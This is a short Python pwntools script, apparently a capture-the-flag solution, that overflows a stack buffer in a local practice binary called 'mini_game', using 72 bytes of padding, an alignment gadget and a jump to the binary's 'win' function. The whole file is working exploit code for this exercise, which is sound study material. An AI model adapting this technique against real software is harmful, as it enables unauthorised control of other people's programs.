#!/usr/bin/env python3 
from pwn import *
context.binary=elf=ELF("./mini_game",checksec=False)

p = process(elf.path)

offset = 72 
ret_add = 0x000000000040101a 

payload = flat (
    b"A" * offset,
    p64(ret_add),
    p64(elf.sym.win)
)

p.recvuntil(b"go?")
p.sendline(payload)
p.interactive()
    